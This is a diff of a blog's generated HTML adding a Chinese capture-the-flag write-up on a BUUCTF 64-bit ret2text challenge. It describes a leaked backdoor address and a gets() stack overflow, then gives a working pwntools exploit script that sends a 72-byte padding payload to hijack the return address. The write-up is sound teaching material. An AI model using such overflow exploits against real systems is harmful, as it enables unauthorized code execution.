@@ -78,7 +78,7 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="http://example.com/404.html"/>
+    <link rel="canonical" href="http://example.com/2026/05/09/rip-ret2text-leak/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
@@ -86,14 +86,21 @@
     
         
         <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Page Not Found">
-<meta property="og:url" content="http://example.com/404.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="rip 自带地址泄露的 ret2text">
+<meta property="og:url" content="http://example.com/2026/05/09/rip-ret2text-leak/index.html">
 <meta property="og:site_name" content="Bear">
 <meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/redefine-og.webp">
+<meta property="article:published_time" content="2026-05-09T20:28:00.000Z">
+<meta property="article:modified_time" content="2026-05-10T17:09:12.699Z">
 <meta property="article:author" content="B1ear">
+<meta property="article:tag" content="64位">
+<meta property="article:tag" content="ret2text">
+<meta property="article:tag" content="动态解析">
+<meta property="article:tag" content="地址泄露">
+<meta property="article:tag" content="栈溢出">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
     
@@ -107,7 +114,7 @@
     
     <title>
         
-            Page Not Found | Bear
+            rip 自带地址泄露的 ret2text | Bear
         
     </title>
 
@@ -416,13 +423,261 @@
 			
 
 			<div class="main-content">
-				<div class="nf-container">
-    <div class="nf-text">
-        <h1>404<br>Page Not Found</h1>
-    </div>
-    <div class="nf-button">
-        <a href="/" class="button large center"><i class="fa-regular fa-house"></i> Go Back Home</a>
-    </div>
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">rip 自带地址泄露的 ret2text</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] shrink-0 rounded-medium border border-border-color p-px">
+				<img src="/images/avatar.jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">B1ear</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-05-09 20:28</span>
+        <span class="mobile">2026-05-09 20:28</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-05-10 17:09:12</span>
+            <span class="mobile">2026-05-10 17:09:12</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/pwn/">pwn</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/64%E4%BD%8D/">64位</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">栈溢出</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2/">地址泄露</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/ret2text/">ret2text</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E5%8A%A8%E6%80%81%E8%A7%A3%E6%9E%90/">动态解析</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<blockquote>
+<p>BUUCTF Warm Up | 程序主动泄露后门地址，练习动态接收解析技巧</p>
+</blockquote>
+<h2 id="0x01-题目环境"><a href="#0x01-题目环境" class="headerlink" title="0x01 题目环境"></a>0x01 题目环境</h2><table>
+<thead>
+<tr>
+<th>项目</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>平台</td>
+<td>BUUCTF</td>
+</tr>
+<tr>
+<td>架构</td>
+<td>64位 Linux ELF</td>
+</tr>
+<tr>
+<td>核心考点</td>
+<td>栈溢出、地址泄露解析、ret2text</td>
+</tr>
+</tbody></table>
+<h2 id="0x02-逆向分析"><a href="#0x02-逆向分析" class="headerlink" title="0x02 逆向分析"></a>0x02 逆向分析</h2><h3 id="漏洞一：主动地址泄露"><a href="#漏洞一：主动地址泄露" class="headerlink" title="漏洞一：主动地址泄露"></a>漏洞一：主动地址泄露</h3><p>程序在开头打印后门函数地址：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov     esi, offset format      ; &quot;%p\n&quot;</span><br><span class="line">mov     edx, offset sub_40060D  ; 后门函数地址</span><br><span class="line">call    _sprintf</span><br><span class="line">call    _write                  ; 输出 &quot;WOW:0x40060d&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p><code>sub_40060D</code> 是包含 <code>system(&quot;cat flag.txt&quot;)</code> 的后门函数。</p>
+<h3 id="漏洞二：栈缓冲区溢出"><a href="#漏洞二：栈缓冲区溢出" class="headerlink" title="漏洞二：栈缓冲区溢出"></a>漏洞二：栈缓冲区溢出</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_40= byte ptr -40h           ; 距离 rbp 偏移 -0x40 (64字节)</span><br><span class="line">lea     rax, [rbp+var_40]</span><br><span class="line">call    _gets                   ; 无边界检查</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>偏移量</strong>：<code>0x40</code> (64) + <code>8</code> (saved rbp) &#x3D; <strong>72 字节</strong></p>
+<h2 id="0x03-动态地址解析技巧"><a href="#0x03-动态地址解析技巧" class="headerlink" title="0x03 动态地址解析技巧"></a>0x03 动态地址解析技巧</h2><p>虽然可以硬编码 <code>0x40060D</code>，但在开启 PIE 的题目中地址每次运行都变。学会动态解析是必备技能：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">b&quot;WOW:&quot;</span>)</span><br><span class="line">leak_str = io.recvline().strip()     <span class="comment"># 接收 &quot;0x40060d&quot;</span></span><br><span class="line">backdoor_addr = <span class="built_in">int</span>(leak_str, <span class="number">16</span>)    <span class="comment"># 十六进制字符串转 int</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="0x04-Exploit-代码"><a href="#0x04-Exploit-代码" class="headerlink" title="0x04 Exploit 代码"></a>0x04 Exploit 代码</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">26271</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 动态解析后门地址</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;WOW:&quot;</span>)</span><br><span class="line">leak_str = io.recvline().strip()</span><br><span class="line">backdoor_addr = <span class="built_in">int</span>(leak_str, <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">f&quot;Parsed Backdoor Address: <span class="subst">&#123;<span class="built_in">hex</span>(backdoor_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 构造 Payload</span></span><br><span class="line">offset = <span class="number">64</span> + <span class="number">8</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * offset + p64(backdoor_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 发送 Payload</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;&gt;&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 获取 Flag</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="0x05-执行结果分析"><a href="#0x05-执行结果分析" class="headerlink" title="0x05 执行结果分析"></a>0x05 执行结果分析</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag: flag&#123;b61c9b34-d35c-4480-8827-3487229143e5&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>为什么拿完 Flag 会崩溃？</strong></p>
+<p>后门函数只执行 <code>system(&quot;cat flag.txt&quot;)</code> 而非交互式 Shell。执行完毕后函数试图 <code>return</code>，但栈已被破坏，跳到无效地址引发 Segfault。这是正常现象。</p>
+<h2 id="0x06-核心考点"><a href="#0x06-核心考点" class="headerlink" title="0x06 核心考点"></a>0x06 核心考点</h2><ul>
+<li><strong>动态地址解析</strong>：<code>int(leak_str, 16)</code> 将十六进制字符串转为地址</li>
+<li><strong>ret2text</strong>：劫持到程序自带的后门代码</li>
+<li><strong>后门函数类型</strong>：执行命令型 vs 交互式 Shell 型</li>
+<li><strong>栈破坏后的崩溃</strong>：理解为什么非交互式后门执行完会 Segfault</li>
+</ul>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> rip 自带地址泄露的 ret2text</li>
+        <li><strong>Author:</strong> B1ear</li>
+        <li><strong>Created at
+                :</strong> 2026-05-09 20:28:00</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-05-10 17:09:12
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://b1ear.github.io/2026/05/09/rip-ret2text-leak/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/64%E4%BD%8D/">#64位</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">#栈溢出</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2/">#地址泄露</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/ret2text/">#ret2text</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E5%8A%A8%E6%80%81%E8%A7%A3%E6%9E%90/">#动态解析</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2026/05/09/jarvisoj-level2-ret2libc/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">jarvisoj_level2 32位 ret2libc 栈溢出</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2026/05/09/ret2text/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">ret2text 后门函数跳过随机数校验</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">rip 自带地址泄露的 ret2text</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E9%A2%98%E7%9B%AE%E7%8E%AF%E5%A2%83"><span class="nav-text">0x01 题目环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="nav-text">0x02 逆向分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%B8%80%EF%BC%9A%E4%B8%BB%E5%8A%A8%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2"><span class="nav-text">漏洞一：主动地址泄露</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BA%8C%EF%BC%9A%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA"><span class="nav-text">漏洞二：栈缓冲区溢出</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%8A%A8%E6%80%81%E5%9C%B0%E5%9D%80%E8%A7%A3%E6%9E%90%E6%8A%80%E5%B7%A7"><span class="nav-text">0x03 动态地址解析技巧</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-Exploit-%E4%BB%A3%E7%A0%81"><span class="nav-text">0x04 Exploit 代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C%E5%88%86%E6%9E%90"><span class="nav-text">0x05 执行结果分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-%E6%A0%B8%E5%BF%83%E8%80%83%E7%82%B9"><span class="nav-text">0x06 核心考点</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
 </div>
 
 			</div>
@@ -460,6 +715,22 @@
 		</div>
 	</div>
 
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+	</ul>
+</div>
+	</div>
 	
 
 	<div class="right-side-tools-container">
@@ -584,6 +855,7 @@
         }),
     );
 </script>
+
 
 
 
